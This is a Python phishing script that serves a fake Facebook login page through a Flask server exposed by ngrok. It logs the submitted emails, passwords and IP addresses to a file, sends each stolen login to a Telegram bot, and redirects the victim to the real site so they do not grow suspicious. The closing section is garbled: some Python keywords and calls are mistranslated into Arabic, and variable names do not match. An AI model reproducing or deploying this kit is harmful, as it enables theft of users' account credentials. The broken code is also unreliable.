# !/usr/bin/env python3
# -*- coding: utf-8 -*-
# LEGAL DISCLAIMER: For educational purposes only. Unauthorized access to systems is illegal. Rebel at your own risk.

import os
import requests
import threading
from flask import Flask, request, redirect, render_template_string
from pyngrok import ngrok

# ░█▀▀░█░░░█▀█░█▀▀░█▀▄░█▀▀░▀█▀░█▀▀░█▀▄
# ░█▀▀░█░░░█░█░█▀▀░█▀▄░▀▀█░░█░░█▀▀░█▀▄
# ░▀░░░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░░▀░░▀▀▀░▀░▀

app = Flask(__name__)
ngrok.set_auth_token("YOUR_NGROK_AUTH_TOKEN")  # Replace with your ngrok token
public_url = ngrok.connect(5000).public_url  # Expose local server to internet

# ░█▄█░█▀█░█▀▄░█░█░█▀▀░█▀▀░█▀▀
# ░█░█░█░█░█░█░█░█░▀▀█░█▀▀░▀▀█
# ░▀░▀░▀▀▀░▀▀░░▀▀▀░▀▀▀░▀▀▀░▀▀▀

# Clone target login page (example: fake Facebook)
login_page = """
<!DOCTYPE html>
<html>
<head><title>Facebook - Log In</title></head>
<body>
    <form action="/login" method="POST">
        <input type="text" name="email" placeholder="Email">
        <input type="password" name="pass" placeholder="Password">
        <input type="submit" value="Log In">
    </form>
</body>
</html>
"""

# ░█▀▀░█▀█░█▀▄░█▀▀░█▀▀░▀█▀░█▀█░█▀▄░█▀▀
# ░█░░░█░█░█░█░█▀▀░▀▀█░░█░░█░█░█▀▄░▀▀█
# ░▀▀▀░▀▀▀░▀▀░░▀▀▀░▀▀▀░░▀░░▀▀▀░▀░▀░▀▀▀

@app.route('/')
def serve_phish():
    return render_template_string(login_page)

@app.route('/login', methods=['POST'])
def harvest_creds():
    email = request.form.get('email')
    password = request.form.get('pass')
    ip = request.remote_addr
    
    # Log stolen credentials
    with open("credentials.txt", "a") as f:
        f.write(f"{email}:{password} | IP: {ip}\n")
    
    # Exfiltrate via Telegram bot (replace with your bot token/chat ID)
    telegram_url = f"https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage"
    Slave = {
        "chat_id":"YOUR_CHAT_ID",
        "text": f"NEW HIT 🎣\nEmail: {email}\nPass: {password}\nIP: {ip}"
    }
    requests.post (telegram_url, data=payload)
    
    # إعادة التوجيه إلى الموقع الشرعي لتجنب الشكوك
    Redirection ("https://facebook.com")

# ░█▀▀░█▀█░█▀▄░█▀▀░█▀▀░█▀▀░█▀▀
# ░█░░░█░█░█▀▄░█▀▀░▀▀█░▀▀█░▀▀█
# ░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀▀▀

def start_flask ():
    app.run (port=5000)

def send_phish_link ():
    الطباعة (f"\n[!]Scam phishing URL: {public_url}/login";)
    # Optional: Adding SMS / Email Undesirable Logic Here

 إذا كان __الاسم__ =="__الرئيسية__":
    خيوط. Thread (target=start_flask).start ()
    threading.Thread (الهدف = send_phish_link).بدء ()
